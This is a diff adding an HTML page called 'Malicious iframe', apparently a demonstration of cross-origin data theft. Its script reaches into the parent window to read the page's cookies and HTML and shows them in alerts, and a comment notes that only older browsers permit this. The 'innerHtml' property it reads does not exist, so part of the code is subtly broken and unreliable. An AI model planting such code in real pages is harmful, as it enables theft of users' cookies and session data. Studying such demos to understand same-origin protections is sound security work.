@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious iframe</title>
+</head>
+<body>
+    <h1>Malicious iframe</h1>
+    <p>This iframe attempts to steal data from the parent window.</p>
+    
+    <script>
+        window.alert('Hi');
+        // Malicious JavaScript code in the iframe
+        window.onload = function () {
+            try {
+              // new browser dont allow to access parent window document due to cross origin policy but old browser allow to access parent window document so this code will work in old browser
+                const parentWindow = window.parent;// Access the parent window
+                const parentDocument = parentWindow.document; // Access the parent document
+                const parentCookies = parentDocument.cookie; // Access the parent cookies
+                alert("Stolen Cookies: " + parentCookies);
+
+                // Attempt to read html
+                const stolenData = parentDocument.innerHtml;
+                alert("Stolen Data: " + stolenData);
+            } catch (error) {
+                console.error("Data theft failed:", error);
+            }
+        };
+    </script>
+</body>
+</html>
